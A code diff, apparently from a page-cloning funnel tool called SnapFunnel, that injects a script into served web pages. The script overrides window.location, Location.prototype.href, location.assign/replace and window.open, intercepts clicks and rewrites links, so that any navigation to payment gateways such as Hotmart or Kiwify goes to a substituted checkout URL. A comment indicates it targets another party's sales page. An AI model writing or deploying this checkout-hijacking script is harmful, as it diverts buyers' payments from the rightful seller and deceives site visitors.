@@ -185,60 +185,80 @@ export async function GET(
       $('head').prepend(spaEngine);
     }
 
-    // 2. Script de interceptação de Checkout — Nível Window (funciona em SPAs)
+    // 2. Script de interceptação de Checkout — Nível Window + location.href (funciona em SPAs)
     const engineScript = `
       <script>
         (function() {
           var CHECKOUT_URL = ${JSON.stringify(checkoutUrl)};
-          if (!CHECKOUT_URL) return; // Sem URL configurada, não faz nada
+          if (!CHECKOUT_URL) return;
 
           var GATEWAYS = [
-            'pay.', 'checkout', 'cakto', 'kiwify', 'hotmart', 'eduzz', 'monetizze',
-            'braip', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper',
-            'lowify', 'ironpay', 'lastlink', 'kirvano', 'pagarme', 'stripe', 'mercadopago'
+            'pay.hotmart', 'pay.kiwify', 'pay.', 'hotmart.com', 'checkout', 'cakto',
+            'kiwify', 'hotmart', 'eduzz', 'monetizze', 'braip', 'perfectpay', 'ticto',
+            'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay', 'lastlink',
+            'kirvano', 'pagarme', 'mercadopago'
           ];
 
           function isGatewayUrl(url) {
             if (!url || typeof url !== 'string') return false;
-            var lower = url.toLowerCase();
-            return GATEWAYS.some(function(g) { return lower.includes(g); });
-          }
-
-          function forceCheckout(e) {
-            if (e && e.preventDefault) e.preventDefault();
-            if (e && e.stopPropagation) e.stopPropagation();
-            if (e && e.stopImmediatePropagation) e.stopImmediatePropagation();
-            window.location.href = CHECKOUT_URL;
-            return false;
-          }
-
-          // ─── 1. INTERCEPTAÇÃO NO NÍVEL DA WINDOW (pega TUDO, inclusive botões de SPA) ───
-          window.addEventListener('click', function(e) {
-            var el = e.target;
-            var depth = 0;
-
-            while (el && el !== document.body && depth < 8) {
-              var tag = el.tagName;
-              var href = el.getAttribute ? (el.getAttribute('href') || '') : '';
-
-              // Se é um link para um gateway de pagamento
-              if ((tag === 'A' || tag === 'BUTTON') && isGatewayUrl(href)) {
-                return forceCheckout(e);
-              }
-
-              // Se o href já inclui a nossa URL (evita loop)
-              if (href && href === CHECKOUT_URL) {
-                el = el.parentElement;
-                depth++;
-                continue;
-              }
-
-              el = el.parentElement;
-              depth++;
+            try {
+              var u = new URL(url);
+              var lower = u.hostname + u.pathname;
+              return GATEWAYS.some(function(g) { return lower.includes(g); });
+            } catch(e) {
+              return GATEWAYS.some(function(g) { return url.toLowerCase().includes(g); });
             }
-          }, { capture: true });
+          }
 
-          // ─── 2. INTERCEPTA window.open (SPAs frequentemente usam isso) ───────────────
+          // ─── 1. INTERCEPTA window.location.href (o mais importante!) ────────────────
+          // A SPA da figurinha usa: window.location.href = "https://pay.hotmart.com/..."
+          try {
+            var _loc = window.location;
+            Object.defineProperty(window, 'location', {
+              configurable: true,
+              enumerable: true,
+              get: function() { return _loc; },
+              set: function(val) {
+                if (val && typeof val === 'string' && isGatewayUrl(val)) {
+                  _loc.href = CHECKOUT_URL;
+                } else {
+                  _loc.href = val;
+                }
+              }
+            });
+            // Intercepta também location.href diretamente
+            var _origHrefDescriptor = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+            if (_origHrefDescriptor && _origHrefDescriptor.set) {
+              Object.defineProperty(Location.prototype, 'href', {
+                configurable: true,
+                enumerable: true,
+                get: _origHrefDescriptor.get,
+                set: function(val) {
+                  if (val && typeof val === 'string' && isGatewayUrl(val)) {
+                    _origHrefDescriptor.set.call(this, CHECKOUT_URL);
+                  } else {
+                    _origHrefDescriptor.set.call(this, val);
+                  }
+                }
+              });
+            }
+          } catch(locErr) {
+            console.warn('[SnapFunnel] location intercept error:', locErr);
+          }
+
+          // ─── 2. INTERCEPTA location.assign e location.replace ────────────────────────
+          try {
+            var _origAssign = window.location.assign.bind(window.location);
+            window.location.assign = function(url) {
+              if (isGatewayUrl(url)) { _origAssign(CHECKOUT_URL); } else { _origAssign(url); }
+            };
+            var _origReplace = window.location.replace.bind(window.location);
+            window.location.replace = function(url) {
+              if (isGatewayUrl(url)) { _origReplace(CHECKOUT_URL); } else { _origReplace(url); }
+            };
+          } catch(e2) {}
+
+          // ─── 3. INTERCEPTA window.open ───────────────────────────────────────────────
           var _origOpen = window.open;
           window.open = function(url, target, features) {
             if (url && isGatewayUrl(url.toString())) {
@@ -248,9 +268,26 @@ export async function GET(
             return _origOpen.call(this, url, target, features);
           };
 
-          // ─── 3. PATCHER DE DOM — substitui hrefs direto nos elementos (para não-SPAs) ─
+          // ─── 4. INTERCEPTA cliques a nível Window (captura links de gateway em SPAs) ─
+          window.addEventListener('click', function(e) {
+            var el = e.target;
+            var depth = 0;
+            while (el && el !== document.body && depth < 8) {
+              var href = el.getAttribute ? (el.getAttribute('href') || '') : '';
+              if (href && isGatewayUrl(href)) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                window.location.href = CHECKOUT_URL;
+                return false;
+              }
+              el = el.parentElement;
+              depth++;
+            }
+          }, { capture: true });
+
+          // ─── 5. PATCHER DE DOM — substitui hrefs no HTML estático ───────────────────
           function patchDom() {
-            // Patch em tags <a>
             document.querySelectorAll('a[href]').forEach(function(el) {
               var h = el.getAttribute('href') || '';
               if (h && h !== CHECKOUT_URL && isGatewayUrl(h)) {
@@ -260,32 +297,17 @@ export async function GET(
               }
             });
           }
-
-          // Roda logo no início
           document.addEventListener('DOMContentLoaded', patchDom);
-
-          // ─── 4. MUTATIONOBSERVER — detecta botões adicionados pela SPA depois do load ─
-          var observer = new MutationObserver(function() {
-            patchDom();
-          });
-
-          // Começa a observar assim que tiver um body
-          var startObserver = function() {
+          var obs = new MutationObserver(patchDom);
+          var startObs = function() {
             if (document.body) {
-              observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['href'] });
+              obs.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['href'] });
               patchDom();
-            } else {
-              setTimeout(startObserver, 100);
-            }
+            } else { setTimeout(startObs, 100); }
           };
-          startObserver();
-
-          // Roda a cada 2s por 20s como fallback garantido para SPAs lentas
+          startObs();
           var runs = 0;
-          var fallback = setInterval(function() {
-            patchDom();
-            if (++runs >= 10) clearInterval(fallback);
-          }, 2000);
+          var fb = setInterval(function() { patchDom(); if (++runs >= 10) clearInterval(fb); }, 2000);
 
         })();
       </script>
